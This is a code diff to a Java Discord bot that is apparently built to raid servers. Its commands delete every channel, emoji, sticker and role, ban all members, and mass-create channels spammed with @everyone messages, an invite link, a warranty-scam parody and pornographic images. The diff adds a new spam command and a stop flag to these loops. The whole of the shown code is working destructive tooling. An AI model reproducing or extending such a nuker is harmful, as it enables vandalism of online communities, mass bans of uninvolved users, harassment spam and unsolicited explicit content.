@@ -38,13 +38,34 @@ public final class Bot {
                 .enableCache(CacheFlag.FORUM_TAGS)
                 .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                 // Initialize commands
-                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez())
+                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez(), new Car(), new Stop())
                 .build()
                 .awaitReady();
     }
 
     public Dotenv getConfig() {
         return config;
+    }
+
+    private static boolean stop = false;
+
+    private static final class Stop extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!stop")) return;
+            Guild guild = event.getGuild();
+
+            stop = true;
+
+            try {
+                Thread.sleep(200);
+                stop = false;
+                System.out.println("[LOG] Successfully stopped all actions.");
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+            }
+
+        }
     }
 
     // Create x channels and spam message x times in each channel
@@ -54,13 +75,50 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!hi")) return;
             Guild guild = event.getGuild();
 
+
             // For loop to create channels
             for (int i = 0; i < 25; i++) {
+                if (stop) {
+                    break;
+                }
                 guild.createTextChannel("beamed-by-root").queue(textChannel -> {
                     // For loop to spam message in channels
                     for (int j = 0; j < 50; j++) {
+                        if (stop) {
+                            break;
+                        }
                         try {
                             textChannel.sendMessage("@everyone\n wtf is this dead discord join discord.gg/1hunna").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
+                        } catch (Exception ignored) {
+                        }
+                    }
+                });
+            }
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Create x channels and spam message x times in each channel
+    private static final class Car extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!car")) return;
+            Guild guild = event.getGuild();
+
+
+            // For loop to create channels
+            for (int i = 0; i < 25; i++) {
+                if (stop) {
+                    break;
+                }
+                guild.createTextChannel("car-beep-beep").queue(textChannel -> {
+                    // For loop to spam message in channels
+                    for (int j = 0; j < 50; j++) {
+                        if (stop) {
+                            break;
+                        }
+                        try {
+                            textChannel.sendMessage("@everyone\n We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist.\nhttps://i.imgur.com/MziC6lA.jpg").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                         } catch (Exception ignored) {
                         }
                     }
@@ -76,14 +134,21 @@ public final class Bot {
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!rolez")) return;
             Guild guild = event.getGuild();
+
             Random random = new Random();
 
             // For loop to create roles
             for (int i = 0; i < 25; i++) {
+                if (stop) {
+                    break;
+                }
                 StringBuilder builder = new StringBuilder();
                 int color = random.nextInt();
 
                 for (int j = 0; j < 20; j++) {
+                    if (stop) {
+                        break;
+                    }
                     char c = (char) (random.nextInt(26) + 'a');
                     builder.append(c);
                 }
@@ -106,6 +171,7 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!anime")) return;
             Guild guild = event.getGuild();
 
+
             // NO LONGER USED - using an api for hentai images instead
             // cycle through list of porn images to spam
 /*            List<String> lines = new ArrayList<>();
@@ -121,9 +187,15 @@ public final class Bot {
 
             // For loop to create channels
             for (int i = 0; i < 1; i++) {
+                if (stop) {
+                    break;
+                }
                 guild.createTextChannel("anime").queue(textChannel -> {
                     // For loop to spam prn in channels
                     for (int j = 0; j < 50; j++) {
+                        if (stop) {
+                            break;
+                        }
 
                         // Read data from api and use to spam images
                         StringBuilder builder = new StringBuilder();
@@ -141,11 +213,11 @@ public final class Bot {
 
                         textChannel.sendMessage("@everyone\n" + json).queue(text -> System.out.println("[LOG] Sent Hentai to " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                         // add delay
-                        /*try {
-                            Thread.sleep(1000);
+                        try {
+                            Thread.sleep(200);
                         } catch (InterruptedException e) {
                             Thread.currentThread().interrupt();
-                        }*/
+                        }
                     }
                 });
             }
@@ -163,6 +235,9 @@ public final class Bot {
             // Check if there is channels and delete them
             if (guild.getChannels().size() > 1) {
                 guild.getChannels().forEach(guildChannel -> {
+                    if (stop) {
+                        return;
+                    }
                     guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
                 });
             } else {
@@ -172,9 +247,15 @@ public final class Bot {
             // Check if there is emojis/stickers and delete them
             if (guild.getEmojis().size() > 1 || guild.getStickers().size() > 1) {
                 guild.getEmojis().forEach(richCustomEmoji -> {
+                    if (stop) {
+                        return;
+                    }
                     richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
                 });
                 guild.getStickers().forEach(guildSticker -> {
+                    if (stop) {
+                        return;
+                    }
                     guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
                 });
             } else {
@@ -183,6 +264,9 @@ public final class Bot {
 
             // Check if there are roles and delete them
             guild.getRoles().forEach(role -> {
+                if (stop) {
+                    return;
+                }
                 try {
                     if (guild.getRoles().size() > 1) {
                         role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
@@ -196,6 +280,9 @@ public final class Bot {
 
             // Check if there are members and ban them (if bannable)
             guild.getMembers().forEach(member -> {
+                if (stop) {
+                    return;
+                }
                 try {
                     if (guild.getMembers().size() > 1) {
                         member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
@@ -207,7 +294,6 @@ public final class Bot {
                 }
             });
 
-            event.getMessage().delete().queue();
         }
     }
 
@@ -218,11 +304,18 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomoji")) return;
             Guild guild = event.getGuild();
 
+
             if (guild.getEmojis().size() > 1 || guild.getStickers().size() > 1) {
                 guild.getEmojis().forEach(richCustomEmoji -> {
+                    if (stop) {
+                        return;
+                    }
                     richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
                 });
                 guild.getStickers().forEach(guildSticker -> {
+                    if (stop) {
+                        return;
+                    }
                     guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
                 });
             } else {
@@ -240,15 +333,17 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nochan")) return;
             Guild guild = event.getGuild();
 
+
             if (guild.getChannels().size() > 1) {
                 guild.getChannels().forEach(guildChannel -> {
+                    if (stop) {
+                        return;
+                    }
                     guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
                 });
             } else {
                 System.out.println("[LOG] No channels found.");
             }
-
-            event.getMessage().delete().queue();
         }
     }
 
@@ -259,7 +354,11 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!norole")) return;
             Guild guild = event.getGuild();
 
+
             guild.getRoles().forEach(role -> {
+                if (stop) {
+                    return;
+                }
                 try {
                     if (guild.getRoles().size() > 1) {
                         role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
@@ -282,7 +381,11 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomem")) return;
             Guild guild = event.getGuild();
 
+
             guild.getMembers().forEach(member -> {
+                if (stop) {
+                    return;
+                }
                 try {
                     if (guild.getMembers().size() > 1) {
                         member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
